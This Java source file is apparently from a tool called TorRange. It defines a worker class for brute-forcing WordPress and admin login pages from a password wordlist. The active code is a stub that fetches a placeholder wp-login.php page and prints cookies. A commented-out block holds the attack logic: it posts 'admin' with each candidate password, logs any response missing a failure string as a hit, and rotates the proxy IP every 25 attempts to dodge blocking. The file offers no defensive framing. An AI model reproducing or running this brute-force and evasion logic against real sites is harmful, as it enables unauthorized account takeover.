package com.object0r.TorRange.applications.wordlist.wordpress_brute_force;

import com.object0r.TorRange.ProxyWorkerManager;
import com.object0r.TorRange.applications.wordlist.WordlistConsumerWorker;
import com.object0r.TorRange.helpers.TorRangeHttpHelper;
import com.object0r.toortools.http.HTTP;
import com.object0r.toortools.http.HttpRequestInformation;
import com.object0r.toortools.http.HttpResult;

/**
 * Created by User on 10/4/2016.
 */
public class WordpressWordlistBruteForceWorker extends WordlistConsumerWorker
{
    public WordpressWordlistBruteForceWorker(ProxyWorkerManager manager, int id)
    {
        super(manager, id);
    }

    public void process(String entry)
    {
        try
        {
            HttpRequestInformation httpRequestInformation = new HttpRequestInformation();
            httpRequestInformation.setUrl("http://fsdfsd/wp-login.php");
            httpRequestInformation.setMethodGet();
            HttpResult httpResult = HTTP.request(httpRequestInformation);

            //System.out.println(httpResult.getContentAsString());
            System.out.println(httpResult.getCookiesString());
            System.exit(0);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

        /*System.out.println("Entry: "+entry);
        if (true) {return; }

        String page = TorRangeHttpHelper.postRequest("https://ccffdd/admin/login.php","username=admin&password="+entry+"&Submit=Login",getProxy() , false,"");
        if (page == null )
        {
            changeIp();
            process(entry);

            return;
        }

        else if (!page.contains("Some String."))
        {
            logWinner(page, entry);
        }

        try
        {
            if (threadCounter++ % 25 == 0)
            {
                //System.out.println("Changing ip");
                changeIp();
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }*/
    }
}
